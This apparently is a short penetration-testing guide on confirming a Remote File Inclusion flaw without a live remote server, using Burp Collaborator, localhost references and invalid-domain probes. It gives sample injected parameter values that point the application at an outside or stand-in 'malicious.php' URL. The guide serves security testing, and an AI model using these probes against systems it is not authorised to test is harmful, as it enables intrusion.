You can prove out an RFI vulnerability without needing a remote server by simulating or indicating the potential vulnerability. Here are a few methods:

### Using Burp Collaborator
1. **Enable Burp Collaborator**:
   - Burp Suite Professional includes Burp Collaborator, a tool for detecting vulnerabilities that require external interaction.
   - Use Burp Collaborator to generate a unique URL.
   
2. **Inject Collaborator URL**:
   - Inject the generated URL into the vulnerable parameter.
   - Example: `page=http://COLLABORATOR-URL/malicious.php`

3. **Monitor Interactions**:
   - If the application attempts to fetch the URL, Burp Collaborator will capture this interaction, indicating the vulnerability.

### Local Proof of Concept
1. **Use Localhost**:
   - If the application allows it, you can try referencing files from `localhost` or `127.0.0.1`.
   - Example: `page=http://localhost/malicious.php`

2. **Observe Application Behavior**:
   - Even without a real remote file, the application's response might indicate it tried to fetch the file.
   - Look for error messages or logs that indicate an attempt to access the provided URL.

### Simulated Payload
1. **Inject Common Payloads**:
   - Inject common RFI payloads to see if the application handles them differently.
   - Example: `page=http://invalid-domain/malicious.php`
   
2. **Analyze Responses**:
   - Check the server's response for error messages indicating an attempt to fetch the remote file.
   - Responses like "Could not resolve host" or similar errors suggest the application is attempting the inclusion.

### Using Burp Suite's Repeater
1. **Manual Testing**:
   - Use Burp Suite’s Repeater tool to send requests with the potential RFI payloads.
   - Manually inspect the responses for any signs of remote file fetch attempts.
